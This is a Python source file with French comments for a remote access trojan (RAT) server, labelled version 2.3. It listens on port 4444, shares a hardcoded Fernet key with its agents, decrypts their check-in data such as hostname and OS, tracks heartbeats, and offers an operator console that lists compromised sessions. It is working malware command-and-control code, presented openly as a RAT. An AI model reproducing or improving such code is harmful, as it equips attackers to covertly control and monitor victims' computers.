#!/usr/bin/env python3
"""
Serveur RAT - Version 2.3
Commit: "Fix message protocol - robust implementation"
"""
import socket
import threading
import time
import json
from cryptography.fernet import Fernet

class RobustServer:
    def __init__(self, host="0.0.0.0", port=4444):
        self.host = host
        self.port = port
        self.clients = {}
        self.client_counter = 0
        self.running = False
        
        self.key = b'ZmDfcTF7_60GrrY167zsiPd67pEvs0aGOv2oasOM1Pg='
        self.cipher = Fernet(self.key)
        
    def start(self):
        self.running = True
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            self.sock.bind((self.host, self.port))
            self.sock.listen(5)
            print(f"[*] Serveur démarré sur {self.host}:{self.port}")
            
            while self.running:
                try:
                    client_sock, addr = self.sock.accept()
                    self.client_counter += 1
                    client_id = self.client_counter
                    
                    print(f"[+] Agent connecté depuis {addr[0]}:{addr[1]} (ID: {client_id})")
                    
                    client_thread = threading.Thread(
                        target=self._handle_client,
                        args=(client_sock, client_id, addr),
                        daemon=True
                    )
                    client_thread.start()
                    
                except socket.error:
                    if self.running:
                        print("[-] Erreur socket")
                        
        except Exception as e:
            print(f"[-] Erreur serveur: {e}")
        finally:
            self.stop()
    
    def _handle_client(self, client_sock, client_id, addr):
        """Gère un client avec protocole robuste"""
        try:
            # Ajoute le client
            self.clients[client_id] = {
                "socket": client_sock,
                "addr": addr,
                "info": {},
                "last_seen": time.time()
            }
            
            # Reçoit les infos initiales avec timeout
            client_sock.settimeout(10)
            initial_data = self._receive_full_message(client_sock)
            if initial_data:
                try:
                    decrypted = self.cipher.decrypt(initial_data)
                    client_info = json.loads(decrypted.decode('utf-8'))
                    self.clients[client_id]["info"] = client_info
                    print(f"[*] Client {client_id} info: {client_info.get('hostname', 'Unknown')}")
                    
                    # Envoie confirmation
                    response = {'status': 'connected', 'client_id': client_id}
                    self._send_message(client_sock, response)
                except Exception as e:
                    print(f"[-] Erreur handshake: {e}")
                    return
            
            # Boucle principale avec timeout plus long
            client_sock.settimeout(30)
            while self.running and client_id in self.clients:
                try:
                    data = self._receive_full_message(client_sock)
                    if not data:
                        break
                    
                    # Déchiffre le message
                    decrypted = self.cipher.decrypt(data)
                    message = json.loads(decrypted.decode('utf-8'))
                    
                    self.clients[client_id]["last_seen"] = time.time()
                    
                    # Gestion basique des heartbeats
                    if message.get("type") == "heartbeat":
                        response = {"type": "heartbeat_ack"}
                        self._send_message(client_sock, response)
                        print(f"[DEBUG] Heartbeat de client {client_id}")
                        
                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"[DEBUG] Client {client_id} erreur: {e}")
                    break
                    
        except Exception as e:
            print(f"[-] Erreur client {client_id}: {e}")
        finally:
            self._cleanup_client(client_id)
    
    def _receive_full_message(self, sock):
        """Reçoit un message complet - CORRECTION COMPLÈTE"""
        try:
            # Reçoit la taille du message (4 bytes) en boucle
            size_data = b''
            while len(size_data) < 4:
                chunk = sock.recv(4 - len(size_data))
                if not chunk:
                    return None
                size_data += chunk
            
            # Décode la taille
            message_size = int.from_bytes(size_data, 'big')
            
            # Limite pour sécurité
            if message_size > 50 * 1024 * 1024:  # 50MB max
                print(f"[WARNING] Message trop gros: {message_size}")
                return None
            
            # Reçoit le message complet en chunks
            message_data = b''
            while len(message_data) < message_size:
                chunk_size = min(4096, message_size - len(message_data))
                chunk = sock.recv(chunk_size)
                if not chunk:
                    return None
                message_data += chunk
            
            return message_data
            
        except Exception as e:
            print(f"[DEBUG] Erreur réception: {e}")
            return None
    
    def _send_message(self, sock, message):
        """Envoie un message avec taille - PROTOCOLE ROBUSTE"""
        try:
            # Sérialise et chiffre
            json_data = json.dumps(message)
            encrypted_data = self.cipher.encrypt(json_data.encode('utf-8'))
            
            # Envoie la taille d'abord (4 bytes)
            size_bytes = len(encrypted_data).to_bytes(4, 'big')
            sock.sendall(size_bytes)
            
            # Puis les données
            sock.sendall(encrypted_data)
            return True
            
        except Exception as e:
            print(f"[DEBUG] Erreur envoi: {e}")
            return False
    
    def _cleanup_client(self, client_id):
        """Nettoie un client"""
        if client_id in self.clients:
            try:
                self.clients[client_id]["socket"].close()
            except:
                pass
            try:
                del self.clients[client_id]
                print(f"[-] Client {client_id} déconnecté")
            except KeyError:
                pass
    
    def list_clients(self):
        """Liste les clients connectés"""
        return {
            client_id: {
                "addr": info["addr"],
                "info": info["info"],
                "last_seen": info["last_seen"]
            }
            for client_id, info in self.clients.items()
        }
    
    def stop(self):
        self.running = False
        try:
            self.sock.close()
        except:
            pass

class ServerInterface:
    def __init__(self):
        self.server = None
        
    def start(self, host="0.0.0.0", port=4444):
        self.server = RobustServer(host, port)
        
        server_thread = threading.Thread(target=self.server.start, daemon=True)
        server_thread.start()
        
        time.sleep(1)
        self.run_interface()
    
    def run_interface(self):
        print("\n" + "="*50)
        print("🎯 RAT SERVER - PROTOCOLE ROBUSTE")
        print("="*50)
        print("Commandes: sessions, help, exit")
        
        while True:
            try:
                user_input = input("rat > ").strip()
                
                if not user_input:
                    continue
                
                parts = user_input.split()
                cmd = parts[0].lower()
                
                if cmd == "sessions":
                    self.list_sessions()
                elif cmd == "help":
                    self.show_help()
                elif cmd in ["exit", "quit"]:
                    if self.server:
                        self.server.stop()
                    break
                else:
                    print(f"[-] Commande inconnue: {cmd}")
                    
            except KeyboardInterrupt:
                print("\n[*] Arrêt du serveur...")
                if self.server:
                    self.server.stop()
                break
    
    def list_sessions(self):
        clients = self.server.list_clients()
        
        if not clients:
            print("[*] Aucune session active")
            return
        
        print(f"\n[*] Sessions actives ({len(clients)}):")
        print("-" * 50)
        print(f"{'ID':<4} {'Hostname':<15} {'OS':<10} {'IP':<15}")
        print("-" * 50)
        
        for client_id, info in clients.items():
            client_info = info['info']
            
            print(f"{client_id:<4} "
                  f"{client_info.get('hostname', 'N/A')[:15]:<15} "
                  f"{client_info.get('os', 'N/A')[:10]:<10} "
                  f"{info['addr'][0]:<15}")
    
    def show_help(self):
        print("""
Commandes disponibles:
  sessions  - Liste les sessions actives
  help      - Affiche cette aide
  exit/quit - Quitte le serveur
        """)

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="Serveur RAT robuste")
    parser.add_argument("--host", default="0.0.0.0", help="Adresse d'écoute")
    parser.add_argument("--port", type=int, default=4444, help="Port d'écoute")
    
    args = parser.parse_args()
    
    interface = ServerInterface()
    interface.start(args.host, args.port)

if __name__ == "__main__":
    main()